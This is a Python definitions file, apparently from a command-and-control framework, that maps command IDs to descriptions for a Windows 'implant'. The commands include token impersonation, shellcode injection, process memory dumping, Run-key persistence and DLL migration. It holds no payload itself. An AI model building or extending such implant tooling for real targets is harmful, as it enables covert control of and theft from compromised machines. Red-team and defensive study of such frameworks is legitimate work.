# Command IDs — must match generated_commands.h in the C implant.

CMD_INSPECT_TOKEN    = 4
CMD_IMPERSONATE_TOKEN = 5
CMD_ENABLE_PRIVILEGE  = 6
CMD_DISABLE_PRIVILEGE = 7
CMD_HOST_NAME         = 8
CMD_WHOAMI            = 9

# Filesystem
CMD_LS               = 10
CMD_CAT              = 11
CMD_MKDIR            = 12
CMD_RM               = 13
CMD_UPLOAD           = 14
CMD_DOWNLOAD         = 15

# System enumeration
CMD_PS               = 16
CMD_GETPID           = 17

# Execution
CMD_EXEC             = 18
CMD_SHELLCODEEXEC    = 19

# Memory / object inspection
CMD_MEMREAD          = 20
CMD_MODULELIST       = 21
CMD_HANDLELIST       = 22

# Environment
CMD_ENV              = 23
CMD_GETENV           = 24
CMD_SETENV           = 25

# Implant management
CMD_SLEEP            = 26
CMD_KILL             = 27
CMD_PERSIST          = 28
CMD_UNPERSIST        = 29
CMD_MIGRATE          = 30

COMMAND_SPECS = [
    # Token / identity
    {'id': CMD_INSPECT_TOKEN,    'name': 'inspect-token',
     'usage': 'inspect-token',
     'description': 'Display all privileges on the current process token'},
    {'id': CMD_IMPERSONATE_TOKEN,'name': 'impersonate-token',
     'usage': 'impersonate-token <pid>',
     'description': 'Impersonate the token of a target process'},
    {'id': CMD_ENABLE_PRIVILEGE, 'name': 'enable-privilege',
     'usage': 'enable-privilege <name>',
     'description': 'Enable a privilege on the current process token'},
    {'id': CMD_DISABLE_PRIVILEGE,'name': 'disable-privilege',
     'usage': 'disable-privilege <name>',
     'description': 'Disable a privilege on the current process token'},
    {'id': CMD_HOST_NAME,        'name': 'hostname',
     'usage': 'hostname',
     'description': 'Return the implant host computer name'},
    {'id': CMD_WHOAMI,           'name': 'whoami',
     'usage': 'whoami',
     'description': 'Return current username and admin status'},

    # Filesystem
    {'id': CMD_LS,    'name': 'ls',
     'usage': 'ls <remote_path>',
     'description': 'List directory contents on the implant host'},
    {'id': CMD_CAT,   'name': 'cat',
     'usage': 'cat <remote_path>',
     'description': 'Display the text contents of a remote file'},
    {'id': CMD_MKDIR, 'name': 'mkdir',
     'usage': 'mkdir <remote_path>',
     'description': 'Create a directory on the implant host'},
    {'id': CMD_RM,    'name': 'rm',
     'usage': 'rm <remote_path>',
     'description': 'Delete a file or empty directory on the implant host'},
    {'id': CMD_UPLOAD,'name': 'upload',
     'usage': 'upload <remote_path> <local_path>',
     'description': 'Transfer a local file to the implant host'},
    {'id': CMD_DOWNLOAD,'name': 'download',
     'usage': 'download <remote_path>',
     'description': 'Transfer a file from the implant host to the operator'},

    # System enumeration
    {'id': CMD_PS,    'name': 'ps',
     'usage': 'ps',
     'description': 'List running processes (PID + image name)'},
    {'id': CMD_GETPID,'name': 'getpid',
     'usage': 'getpid',
     'description': 'Return the implant process ID'},

    # Execution
    {'id': CMD_EXEC,          'name': 'exec',
     'usage': 'exec <command>',
     'description': 'Execute a shell command and return output + exit code'},
    {'id': CMD_SHELLCODEEXEC, 'name': 'shellcodeexec',
     'usage': 'shellcodeexec <pid> <shellcode_file>',
     'description': 'Inject and run shellcode (pid=0 → self-inject)'},

    # Memory / object inspection
    {'id': CMD_MEMREAD,   'name': 'memread',
     'usage': 'memread <pid> <address_hex> <size>',
     'description': 'Dump memory from a process address space'},
    {'id': CMD_MODULELIST,'name': 'modulelist',
     'usage': 'modulelist <pid>',
     'description': 'List loaded modules and their base addresses'},
    {'id': CMD_HANDLELIST,'name': 'handlelist',
     'usage': 'handlelist <pid>',
     'description': 'List all handles for a given process'},

    # Environment
    {'id': CMD_ENV,   'name': 'env',
     'usage': 'env',
     'description': 'List all environment variables of the implant process'},
    {'id': CMD_GETENV,'name': 'getenv',
     'usage': 'getenv <name>',
     'description': 'Return the value of one environment variable'},
    {'id': CMD_SETENV,'name': 'setenv',
     'usage': 'setenv <NAME=VALUE>',
     'description': 'Create or modify an environment variable'},

    # Implant management
    {'id': CMD_SLEEP,    'name': 'sleep',
     'usage': 'sleep <ms>',
     'description': 'Change the beacon callback interval (milliseconds)'},
    {'id': CMD_KILL,     'name': 'kill',
     'usage': 'kill',
     'description': 'Stop the implant after the current task result is posted'},
    {'id': CMD_PERSIST,  'name': 'persist',
     'usage': 'persist',
     'description': 'Install HKCU Run key persistence for auto-restart on login'},
    {'id': CMD_UNPERSIST,'name': 'unpersist',
     'usage': 'unpersist',
     'description': 'Remove the HKCU Run key persistence entry'},
    {'id': CMD_MIGRATE,  'name': 'migrate',
     'usage': 'migrate <pid>',
     'description': 'Inject the implant DLL into another process'},
]

CMD_NAMES = {spec['id']: spec['name'] for spec in COMMAND_SPECS}
CMD_IDS   = {spec['name']: spec['id'] for spec in COMMAND_SPECS}
